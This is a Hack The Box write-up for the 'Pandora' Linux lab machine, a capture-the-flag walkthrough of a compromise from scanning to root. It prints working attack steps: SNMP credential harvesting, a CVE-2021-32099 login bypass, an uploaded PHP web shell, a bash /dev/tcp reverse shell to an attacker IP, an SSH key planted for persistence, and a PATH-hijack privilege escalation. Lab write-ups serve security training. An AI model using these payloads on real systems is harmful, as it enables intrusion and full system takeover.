# Pandora - HTB Labs Writeup

**Machine:** Pandora (Linux)

**Difficulty:** Easy


<img width="1036" height="217" alt="1" src="https://github.com/user-attachments/assets/69ec213f-3900-4d6f-9d77-e68229c357a0" />


## Background / Scope

-**TargetIP:** `10.10.11.136`

-**Goal:** Obtain Administrator access on the machine in a lab environment

-**Machine Info:**  Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box. Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials for user `daniel`. Host enumeration reveals Pandora FMS running on an internal port, which can be accessed through port forwarding. Lateral movement to another user called `matt` is achieved by chaining SQL injection &amp;amp;amp;amp; RCE vulnerabilities in the PandoraFMS service. Privilege escalation to user `root` is performed by exploiting a SUID binary for PATH variable injection.


## Target Enumeration (nmap)

I'll start with Nmap scanning

```python
nmap -sC -sV 10.10.11.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 11:12 EST
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.71s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.99 seconds
```

Two services are running on this machine:`SSH(22)` and `HTTP(80)`.Let's check what can we find on HTTP service


<img width="1198" height="563" alt="2" src="https://github.com/user-attachments/assets/030e0a6e-6687-47e6-a873-dc48d0e3960f" />


I didn't find anything interesting here



## Directory Brute Force

I'll run `feroxbuster` to brute force directory

```python
feroxbuster -u http://10.10.11.136 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.136/
 🚩  In-Scope Url          │ 10.10.11.136
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       31w      622c http://10.10.11.136/assets/images/faq/shape.svg
200      GET       35l      183w    14785c http://10.10.11.136/assets/images/testimonials/author-03.png
200      GET        1l      730w     7340c http://10.10.11.136/assets/images/hero/dotted-shape.svg
200      GET        1l      447w     7311c http://10.10.11.136/assets/images/hero/brand.svg
200      GET        1l      467w    11946c http://10.10.11.136/assets/images/brands/ecommerce-html.svg
200      GET        7l     1019w    78468c http://10.10.11.136/assets/js/bootstrap.bundle.min.js
200      GET       27l      174w    14698c http://10.10.11.136/assets/images/testimonials/author-02.png
200      GET        1l      111w     1965c http://10.10.11.136/assets/images/logo/logo.svg
200      GET        1l       87w     1454c http://10.10.11.136/assets/images/brands/ayroui.svg
200      GET        1l      296w     5850c http://10.10.11.136/assets/images/brands/lineicons.svg
```

I found `/assets` directory, but nothing I found here for my enumeration

<img width="540" height="350" alt="3" src="https://github.com/user-attachments/assets/be463af7-105c-4387-982d-b9cbf5118506" />


In such case, I always try to find any missing port, so I try to find if there are some `UDP` port

```python
nmap -sU --top-ports 100 10.10.11.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 11:34 EST
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.54s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 173.33 seconds
```

There we go!I have found `SNMP` service is running on this machine.Let's enumerate this service.




## SNMP Enumeration

I'll run `snmpbulkwalk` with parametr `-Cr1000` which means:
`-C` specifies SNMP options.`r1000` means max-repetitions = 1000.This tells the SNMP agent to send up to 1000 OID values per request.Much more efficient than the default (which is usually much lower).It's more faster than `snmpwalk -v2c -c public 10.10.11.136` command
```text
snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136
```

I found creds on the snmp output.As we remember only `SSH` is running on this machine which require username and password


<img width="1279" height="459" alt="4" src="https://github.com/user-attachments/assets/a3975b72-1cde-40a6-afcf-f62515b146aa" />


I got SSH access

```python
ssh daniel@10.10.11.136                     
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)                                                                                           

daniel@pandora:~$ 

```


I found on `/etc/nginx/sites-enabled` two config files


```
daniel@pandora:/etc/apache2/sites-enabled$ ls -la
total 8                                                                                                                                                     
drwxr-xr-x 2 root root 4096 Dec  3  2021 .                                                                                                                  
drwxr-xr-x 8 root root 4096 Dec  7  2021 ..                                                                                                                 
lrwxrwxrwx 1 root root   35 Dec  3  2021 000-default.conf -> ../sites-available/000-default.conf                                                            
lrwxrwxrwx 1 root root   31 Dec  3  2021 pandora.conf -> ../sites-available/pandora.conf
```

As we can see in `pandora.conf`, there is virtual host
```text
daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf                                                                                                 
<VirtualHost localhost:80>                                                                                                                                  
  ServerAdmin admin@panda.htb                                                                                                                               
  ServerName pandora.panda.htb                                                                                                                              
  DocumentRoot /var/www/pandora                                                                                                                             
  AssignUserID matt matt                                                                                                                                    
  <Directory /var/www/pandora>                                                                                                                              
    AllowOverride All                                                                                                                                       
  </Directory>                                                                                                                                              
  ErrorLog /var/log/apache2/error.log                                                                                                                       
  CustomLog /var/log/apache2/access.log combined                                                                                                            
</VirtualHost>
```
First I'll add my virtual host in `/etc/hosts`
```text
10.10.11.136             panda.htb  pandora.panda.htb
```
Virtual host is running on `localhost:80`, so I need to do port forwarding with parameters `-L 9001:localhost:80`

```python
ssh daniel@10.10.11.136 -L 9001:localhost:80
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html                                
daniel@10.10.11.136's password:                                     
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
daniel@pandora:~$ 

```


<img width="1207" height="632" alt="5" src="https://github.com/user-attachments/assets/09a95314-0926-48a3-90b0-888b8322b20e" />



## CVE-2021-32099 


A SQL injection vulnerability in the pandora_console component of Artica Pandora FMS 742 allows an unauthenticated attacker to upgrade his unprivileged session via the /include/chart_generator.php session_id parameter, leading to a login bypass..[This post]( https://github.com/akr3ch/CVE-2021-32099) shows how to login as Admin


<img width="1279" height="565" alt="6" src="https://github.com/user-attachments/assets/79f17541-189c-4ac3-b80e-70ef226a6b3c" />


## Upload Files Vulnerbility

I can upload files on the `Admin Tools----> File Manager`.I made my shell payload `<?php system($_REQUEST['cmd']); ?>
` and saved it as `upload.php`



<img width="1265" height="508" alt="7" src="https://github.com/user-attachments/assets/d2a9b98d-ba49-4ad1-bb98-bb107d756ee8" />

It worked!

```text
curl http://localhost:9001/pandora_console/images/upload.php?cmd=id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
```

Now we can get reverse shell

```text
curl 'http://localhost:9001/pandora_console/images/upload.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"'
```
We got it!

```text
nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.136] 54634
bash: cannot set terminal process group (859): Inappropriate ioctl for device
bash: no job control in this shell
matt@pandora:/var/www/pandora/pandora_console/images$
```

Obtained `user.txt`
```text
matt@pandora:/home/matt$ cat user.txt
cat user.txt
9f252c2b8d58398dc***************
```


## Privilege Escalation

My reverse terminal doesn't work properly, so I try to create my own keys and copy it to the `/home/matt/.ssh/authorized_keys` directory.To create my keys I run `ssh-keygen` 

```python
ssh-keygen -t rsa -b 4096 -f matt
Generating public/private rsa key pair.
Enter passphrase for "matt" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in matt
Your public key has been saved in matt.pub
The key fingerprint is:
SHA256:2vcHJueiEKmiiaxCJ1BYIyLqNgAXX9qZ+Rmn657AXaY root@odinaev
The key's randomart image is:
+---[RSA 4096]----+
|=o=.  .          |
|*o.o + +         |
|o.  o = . .      |
|+      o =       |
|.+    o S o      |
|.o.. o = =. +    |
|. + . = E .= .   |
|+o .   + o... .  |
|B.     .=. ...   |
+----[SHA256]-----+
                                                                    
┌──(root㉿odinaev)-[/home/odinaev/Downloads/pandora]
└─# ls
matt  matt.pub
```

```python
matt@pandora:/home/matt$ mkdir .ssh
mkdir .ssh
matt@pandora:/home/matt$ cd .ssh
cd .ssh
matt@pandora:/home/matt/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCXqwFcyWnnZs04EfjIlPU79Y4tX4ZZNcyfrVsDnV3kerZdCLPIfgWOdTVyjvP2UC5TMmQpgdaiamfgvlu8pNI9YAjZZvqOjjutos31Gxb4oF/pnc+emwKvpZYKW2fU1xL4z7aZPqof4jQgM5XooJQ4Q0L5aBrup4NMA62D3t0GCchq+kTAWML/oVDT1h4axIBG7fk7bTXWjjjfuieKjSHASoXfULERORgGNSRVH+7j00tfhtXUxfFVTGGfzh6dcpHnN7Sz6/pChuGcE3mH0dW7RIp5gWwCyMGgdvs6BGsoif2YyVqvVvNbqBbECurV9cN6//2yjBWwRVVLXIaErUSx+DSbWLKV/EVKVsIpeIhkewP4gyZbpVhlTwNwhjfarExadzvZOj0BiV2bi04kKUWTbKeqpKb20233By/Mq8EXZAozzYChEF29JQLCnCggu0HaGL9az8R45fqM8S5pSOyPtIlEv+wFrlh4Yylt4bkYYffT9I+LSSg1OrP1C7U4boqjL9ISn0+ll8fFyFOvYPE2oKHyVumzrxkJMtTJVgWwIQL0aepvD7nx6B5pFQbTjKXU4vyLCa4EeAwxnlrRRAMWBFhii9bDB0cWAXBAqY7viSgfFGzwcxxo0sZ4ajiQDlXgHpQNM2L6GJ/7Cl2k/UiGOP/Obs2tJZHLgTpztBKsOw== real@madrid" > authorized_keys
<bs2tJZHLgTpztBKsOw== real@madrid" > authorized_keys

matt@pandora:/home/matt/.ssh$ 
matt@pandora:/home/matt/.ssh$ ls
ls
authorized_keys
matt@pandora:/home/matt/.ssh$ 
```

Now I can get access with my keys via `SSH`

```python
chmod 600 matt   
                                                                    
┌──(root㉿odinaev)-[/home/odinaev/Downloads/pandora]
└─# ssh -i matt matt@10.10.11.136                 


matt@pandora:~$ 
```


I tried to find `SUID` binaries on the system and found `/usr/bin/pandora_backup` binaries

```python
matt@pandora:~$ find / -perm -4000 2>/dev/null
/usr/bin/sudo                                                       
/usr/bin/pkexec                                                     
/usr/bin/chfn                                                       
/usr/bin/newgrp                                                     
/usr/bin/gpasswd                                                    
/usr/bin/umount                                                     
/usr/bin/pandora_backup                                             
/usr/bin/passwd                                                     
/usr/bin/mount                                                      
/usr/bin/su                                                         
/usr/bin/at                                                         
/usr/bin/fusermount                                                 
/usr/bin/chsh                                                       
/usr/lib/openssh/ssh-keysign                                        
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                         
/usr/lib/eject/dmcrypt-get-device                                   
/usr/lib/policykit-1/polkit-agent-helper-1
```


I run this binary.It looks like this binary trying extracting files and doing backup



<img width="706" height="569" alt="8" src="https://github.com/user-attachments/assets/f28286cf-90f5-4e31-86da-0e03a0a9aa33" />


`ltrace` shows me that our script is trying to run `tar` in the /root/.backup/pandora-backup.tar.gz, but there is no permission for this

```python
matt@pandora:~$ ltrace pandora_backup
getuid()                                 = 1000
geteuid()                                = 1000
setreuid(1000, 1000)                     = 0
puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
)        = 26
puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
) = 43
system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                   = 512
puts("Backup failed!\nCheck your permis"...Backup failed!
Check your permissions!
) = 39
+++ exited (status 1) +++
```

## Path Hijacking

The script calls tar without an absolute path.It relies on the system's `PATH` to find the executable.I control the PATH environment variable

```python 
#Checked our current PATh
matt@pandora:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

# Prepend your controlled directory to PATH
export PATH=/dev/shm:$PATH

#Verified the chacnge
matt@pandora:~$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

```

```python
# Created a fake 'tar' that spawns a shell
matt@pandora:~$echo '#!/bin/bash' > /dev/shm/tar
echo 'bash' >> /dev/shm/tar

# Made it executable
matt@pandora:~$chmod +x /dev/shm/tar
```

I run again this binary and got `root`

```matt@pandora:~$ pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~# 
```

Obtain `root.txt`

```text

root@pandora:~# cat /root/root.txt
9fde52464e924e5e76**************

```

⭐ If you found this writeup helpful — consider giving a star on GitHub!








